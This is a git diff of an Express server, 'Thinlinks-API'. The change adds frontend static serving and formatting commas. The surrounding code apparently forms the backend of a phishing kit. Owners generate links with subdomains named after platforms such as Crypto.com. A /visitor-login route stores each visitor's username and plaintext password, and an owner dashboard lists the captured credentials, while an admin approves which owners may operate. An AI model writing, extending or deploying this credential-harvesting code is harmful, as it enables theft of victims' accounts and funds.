@@ -4,8 +4,16 @@ import cors from "cors";
 import crypto from "crypto"; // generates secure random invite tokens
 import bcrypt from "bcryptjs"; // secures admin credentials with hashing
 import dotenv from "dotenv";
+import path from "path";
+import fs from "fs";
+import { fileURLToPath } from "url";
 
 dotenv.config();
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+const frontendDistPath = path.resolve(__dirname, "../../frontend/dist");
+const hasFrontendDist = fs.existsSync(frontendDistPath);
 
 const {
   DATABASE_URL,
@@ -107,7 +115,7 @@ async function isPasswordCompromised(password) {
   const suffix = hashHex.substring(5);
   try {
     const response = await fetch(
-      `https://api.pwnedpasswords.com/range/${prefix}`
+      `https://api.pwnedpasswords.com/range/${prefix}`,
     );
 
     if (!response.ok) {
@@ -174,13 +182,20 @@ app.use((req, res, next) => {
   console.log(
     `${new Date().toISOString()} ${req.method} ${req.originalUrl} origin=${
       req.headers.origin || "<none>"
-    }`
+    }`,
   );
   res.set("X-Service", "Thinlinks-API");
   next();
 });
 
+if (hasFrontendDist) {
+  app.use(express.static(frontendDistPath));
+}
+
 app.get("/", (req, res) => {
+  if (hasFrontendDist && req.accepts("html")) {
+    return res.sendFile(path.join(frontendDistPath, "index.html"));
+  }
   res.json({ status: "ok" });
 });
 
@@ -223,10 +238,10 @@ async function initializeDatabase() {
     `); // core owner accounts table
 
     await db.query(
-      `ALTER TABLE owners ADD COLUMN IF NOT EXISTS is_verified BOOLEAN DEFAULT false`
+      `ALTER TABLE owners ADD COLUMN IF NOT EXISTS is_verified BOOLEAN DEFAULT false`,
     ); // flags accounts that the admin has approved
     await db.query(
-      `ALTER TABLE owners ADD COLUMN IF NOT EXISTS created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()`
+      `ALTER TABLE owners ADD COLUMN IF NOT EXISTS created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()`,
     ); // timestamps account creation for admin auditing
 
     await db.query(`
@@ -260,7 +275,7 @@ async function initializeDatabase() {
     `); // stores each visitor login attempt with token metadata
 
     await db.query(
-      "ALTER TABLE link_visits ADD COLUMN IF NOT EXISTS visitor_password TEXT"
+      "ALTER TABLE link_visits ADD COLUMN IF NOT EXISTS visitor_password TEXT",
     ); // ensures older databases capture the visitor password for review
 
     await ensureAdminAccount();
@@ -273,7 +288,7 @@ async function ensureAdminAccount() {
   try {
     const existing = await db.query(
       "SELECT id, password FROM admins WHERE username = $1",
-      [ADMIN_USERNAME]
+      [ADMIN_USERNAME],
     );
 
     const hashedPassword = await bcrypt.hash(ADMIN_PASSWORD, 12);
@@ -281,7 +296,7 @@ async function ensureAdminAccount() {
     if (existing.rowCount === 0) {
       await db.query(
         "INSERT INTO admins (username, password) VALUES ($1, $2)",
-        [ADMIN_USERNAME, hashedPassword]
+        [ADMIN_USERNAME, hashedPassword],
       ); // seeds the admin account with a hashed password if missing
       return;
     }
@@ -318,7 +333,7 @@ app.post("/signup", async (req, res) => {
 
     const existing = await db.query(
       "SELECT id FROM owners WHERE username = $1",
-      [username]
+      [username],
     );
 
     if (existing.rowCount > 0) {
@@ -331,7 +346,7 @@ app.post("/signup", async (req, res) => {
 
     const result = await db.query(
       "INSERT INTO owners (username, password) VALUES ($1, $2) RETURNING id, username, is_verified, created_at",
-      [username, hashedPassword]
+      [username, hashedPassword],
     ); // new sign-ups start unverified until the admin approves them
 
     res.status(201).json({
@@ -350,7 +365,7 @@ app.post("/login", async (req, res) => {
   try {
     const result = await db.query(
       "SELECT id, username, password, is_verified FROM owners WHERE username = $1",
-      [username]
+      [username],
     );
 
     if (result.rowCount === 0) {
@@ -432,7 +447,7 @@ app.post("/link-tokens", async (req, res) => {
 
     await db.query(
       "INSERT INTO link_tokens (token, owner_id, platform) VALUES ($1, $2, $3)",
-      [token, ownerId, platform]
+      [token, ownerId, platform],
     ); // persists the new token for future visitor tracking
 
     const sanitizedSubdomain = platform.toLowerCase().replace(/[^a-z0-9]/g, ""); // strips punctuation so names like "Crypto.com" map to cryptocom
@@ -468,7 +483,7 @@ app.post("/visitor-login", async (req, res) => {
   try {
     const tokenResult = await db.query(
       "SELECT owner_id, platform FROM link_tokens WHERE token = $1",
-      [linkToken]
+      [linkToken],
     ); // looks up which owner owns this link token
 
     if (tokenResult.rows.length === 0) {
@@ -485,7 +500,7 @@ app.post("/visitor-login", async (req, res) => {
 
     await db.query(
       "INSERT INTO link_visits (token, owner_id, visitor_username, visitor_password, platform) VALUES ($1, $2, $3, $4, $5)",
-      [linkToken, ownerId, username, visitorPassword, platform]
+      [linkToken, ownerId, username, visitorPassword, platform],
     ); // logs the visitor credentials against the owning account
 
     res.status(201).json({ message: "Visitor login recorded." });
@@ -504,7 +519,7 @@ app.get("/owners/:ownerId/visitors", async (req, res) => {
        FROM link_visits
        WHERE owner_id = $1
        ORDER BY logged_at DESC`,
-      [ownerId]
+      [ownerId],
     ); // pulls the recent visitor history for the owner's dashboard
 
     res.json({ visitors: result.rows });
@@ -547,7 +562,7 @@ app.post("/admin/login", async (req, res) => {
   try {
     const adminResult = await db.query(
       "SELECT id, username, password FROM admins WHERE username = $1",
-      [username]
+      [username],
     );
 
     if (adminResult.rowCount === 0) {
@@ -585,7 +600,7 @@ app.post("/admin/login", async (req, res) => {
 app.get("/admin/owners", requireAdminAuth, async (req, res) => {
   try {
     const owners = await db.query(
-      "SELECT id, username, is_verified, created_at FROM owners ORDER BY created_at DESC"
+      "SELECT id, username, is_verified, created_at FROM owners ORDER BY created_at DESC",
     );
 
     res.json({ owners: owners.rows });
@@ -609,7 +624,7 @@ app.patch(
     try {
       const result = await db.query(
         "UPDATE owners SET is_verified = true WHERE id = $1 RETURNING id, username, is_verified",
-        [ownerIdNumber]
+        [ownerIdNumber],
       );
 
       if (result.rowCount === 0) {
@@ -621,7 +636,7 @@ app.patch(
       console.error("Error verifying owner:", error);
       res.status(500).json({ message: "Failed to verify owner" });
     }
-  }
+  },
 );
 
 app.patch(
@@ -638,7 +653,7 @@ app.patch(
     try {
       const result = await db.query(
         "UPDATE owners SET is_verified = false WHERE id = $1 RETURNING id, username, is_verified",
-        [ownerIdNumber]
+        [ownerIdNumber],
       );
 
       if (result.rowCount === 0) {
@@ -650,7 +665,7 @@ app.patch(
       console.error("Error unverifying owner:", error);
       res.status(500).json({ message: "Failed to unverify owner" });
     }
-  }
+  },
 );
 
 app.delete("/admin/owners/:ownerId", requireAdminAuth, async (req, res) => {
@@ -664,7 +679,7 @@ app.delete("/admin/owners/:ownerId", requireAdminAuth, async (req, res) => {
   try {
     const result = await db.query(
       "DELETE FROM owners WHERE id = $1 RETURNING id",
-      [ownerIdNumber]
+      [ownerIdNumber],
     );
 
     if (result.rowCount === 0) {
@@ -684,7 +699,7 @@ app.delete("/owners/:ownerId/visitors/:visitId", async (req, res) => {
   try {
     const result = await db.query(
       "DELETE FROM link_visits WHERE id = $1 AND owner_id = $2 RETURNING id",
-      [visitId, ownerId]
+      [visitId, ownerId],
     );
 
     if (result.rowCount === 0) {
@@ -697,10 +712,21 @@ app.delete("/owners/:ownerId/visitors/:visitId", async (req, res) => {
     res.status(500).json({ message: "Failed to delete visitor log" });
   }
 });
+
+if (hasFrontendDist) {
+  app.get("*", (req, res, next) => {
+    if (req.method !== "GET") return next();
+    if (!req.accepts("html")) return next();
+    if (req.path.startsWith("/assets/")) {
+      return res.status(404).end();
+    }
+    return res.sendFile(path.join(frontendDistPath, "index.html"));
+  });
+}
 app.listen(APP_PORT, "0.0.0.0", () => {
   console.log(
     `Server is running on port ${APP_PORT}; origins=${resolvedCorsOrigins.join(
-      ","
-    )} dbURL=${DATABASE_URL ? "present" : "missing"}`
+      ",",
+    )} dbURL=${DATABASE_URL ? "present" : "missing"}`,
   );
 });
